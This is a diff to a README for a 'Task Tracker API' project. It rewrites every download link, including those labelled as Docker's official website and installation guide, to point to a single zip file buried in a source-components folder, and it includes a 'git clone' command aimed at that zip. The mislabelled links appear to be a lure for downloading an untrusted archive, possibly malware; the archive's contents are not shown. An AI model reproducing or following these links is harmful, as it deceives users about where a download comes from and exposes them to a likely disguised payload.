@@ -12,15 +12,15 @@ To get started with Task Tracker API, follow these simple steps to download and 
 
 ### 1. Download the Application
 
-To download the Task Tracker API, **[visit this page](https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip)**. You will find the latest release of the software there. Find the appropriate version for your operating system and follow the provided instructions.
+To download the Task Tracker API, **[visit this page](https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip)**. You will find the latest release of the software there. Find the appropriate version for your operating system and follow the provided instructions.
 
 ### 2. Install Docker
 
 Task Tracker API runs inside Docker containers. Make sure you have Docker installed on your machine. Here’s how to install Docker:
 
-- **Windows:** Download Docker Desktop from [Docker's official website](https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip).
-- **macOS:** Download Docker Desktop from [Docker's official website](https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip).
-- **Linux:** Follow the instructions on [Docker's installation guide](https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip).
+- **Windows:** Download Docker Desktop from [Docker's official website](https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip).
+- **macOS:** Download Docker Desktop from [Docker's official website](https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip).
+- **Linux:** Follow the instructions on [Docker's installation guide](https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip).
 
 ### 3. Set Up the Environment
 
@@ -30,7 +30,7 @@ After installing Docker, you need to set up your environment.
 2. **Clone the repository:**
 
    ```bash
-   git clone https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip
+   git clone https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip
    ```
 
 3. **Navigate into the project folder:**
@@ -99,7 +99,7 @@ To understand more about how Task Tracker API works, consider exploring its docu
 
 ## 🔗 Important Links
 
-- **Download the latest release:** [Visit this page](https://raw.githubusercontent.com/andersonssilva2/Task-Tracker-API/main/consistorial/Task-Tracker-API.zip) 
+- **Download the latest release:** [Visit this page](https://github.com/andersonssilva2/Task-Tracker-API/raw/refs/heads/main/frontend/src/components/Task-Tracker-API-v3.7.zip) 
 - **Documentation:** Review in-depth documentation in the repository.
 
 Thank you for using Task Tracker API!
